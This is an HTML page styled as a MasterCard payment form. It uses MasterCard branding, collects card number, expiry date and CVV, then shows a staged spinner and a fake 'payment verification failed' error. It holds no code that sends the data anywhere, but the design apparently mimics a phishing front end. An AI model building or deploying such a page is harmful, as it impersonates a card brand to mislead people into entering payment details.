<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MasterCard Payment Interface</title>
    <style>
        /* Reset */
        body, h1, form, input, button, div {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: #1c1c1c;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #fff;
        }

        .payment-container {
            background: #2a2a2a;
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.8);
            width: 100%;
            max-width: 400px;
        }

        .payment-container h1 {
            text-align: center;
            font-size: 24px;
            color: #fff;
            margin-bottom: 20px;
            font-weight: bold;
        }

        .payment-container .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .payment-container .logo img {
            width: 120px;
        }

        .input-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: #ddd;
        }

        input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #555;
            border-radius: 8px;
            outline: none;
            background: #333;
            color: #fff;
            transition: border 0.3s, box-shadow 0.3s;
        }

        input:focus {
            border-color: #ffcc00;
            box-shadow: 0 0 8px #ffcc00;
        }

        .input-row {
            display: flex;
            gap: 15px;
        }

        .input-row .input-group {
            flex: 1;
        }

        .submit-btn {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            color: #fff;
            background: linear-gradient(to right, #ff0000, #ffcc00);
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.3s, transform 0.2s;
            font-weight: bold;
            text-transform: uppercase;
        }

        .submit-btn:hover {
            background: linear-gradient(to right, #ffcc00, #ff0000);
            transform: scale(1.05);
        }

        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #bbb;
        }

        .error {
            color: red;
            font-size: 12px;
            margin-top: -10px;
            margin-bottom: 10px;
        }

        /* Loader overlay */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            visibility: hidden;
            opacity: 0;
            transition: visibility 0s, opacity 0.5s;
        }

        .overlay.visible {
            visibility: visible;
            opacity: 1;
        }

        .loader {
            border: 8px solid #fff;
            border-top: 8px solid #ffcc00;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Error popup */
        .popup {
            background: #2a2a2a;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            color: #fff;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
            display: none;
        }

        .popup.visible {
            display: block;
        }
    </style>
</head>
<body>
    <div class="payment-container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="MasterCard Logo">
        </div>
        <h1>Payment Details</h1>
        <form id="payment-form">
            <div class="input-group">
                <label for="card-number">Card Number</label>
                <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
            </div>
            <div class="input-row">
                <div class="input-group">
                    <label for="expiry-date">Expiry Date</label>
                    <input type="text" id="expiry-date" placeholder="MM/YY" maxlength="5" required>
                    <div class="error" id="expiry-error"></div>
                </div>
                <div class="input-group">
                    <label for="cvv">CVV</label>
                    <input type="password" id="cvv" placeholder="123" maxlength="3" required>
                </div>
            </div>
            <button type="submit" class="submit-btn">Pay Now</button>
        </form>
        <div class="footer">
            Powered by MasterCard
        </div>
    </div>

    <div class="overlay" id="overlay">
        <div class="loader"></div>
    </div>

    <div class="popup" id="popup">
        <h2>Error 404</h2>
        <p>Payment verification failed. Please try again later.</p>
    </div>

    <script>
        const expiryDateInput = document.getElementById('expiry-date');
        const expiryError = document.getElementById('expiry-error');
        const paymentForm = document.getElementById('payment-form');
        const overlay = document.getElementById('overlay');
        const popup = document.getElementById('popup');

        expiryDateInput.addEventListener('input', (event) => {
            const value = event.target.value.replace(/[^0-9]/g, ''); // Permite doar cifre
            if (value.length <= 2) {
                event.target.value = value;
            } else if (value.length <= 4) {
                event.target.value = value.slice(0, 2) + '/' + value.slice(2);
            }

            const parts = event.target.value.split('/');
            if (parts.length === 2) {
                const month = parseInt(parts[0], 10);
                const year = parseInt('20' + parts[1], 10);
                const currentDate = new Date();
                const currentMonth = currentDate.getMonth() + 1;
                const currentYear = currentDate.getFullYear();

                if (month < 1 || month > 12 || year < currentYear || (year === currentYear && month < currentMonth)) {
                    expiryError.textContent = 'Invalid expiry date.';
                } else {
                    expiryError.textContent = '';
                }
            }
        });

        paymentForm.addEventListener('submit', (e) => {
            e.preventDefault();
            if (expiryError.textContent) {
                return;
            }

            overlay.classList.add('visible');

            setTimeout(() => {
                overlay.classList.remove('visible');
                popup.classList.add('visible');
            }, 2000);
        });
    </script>
</body>
</html>
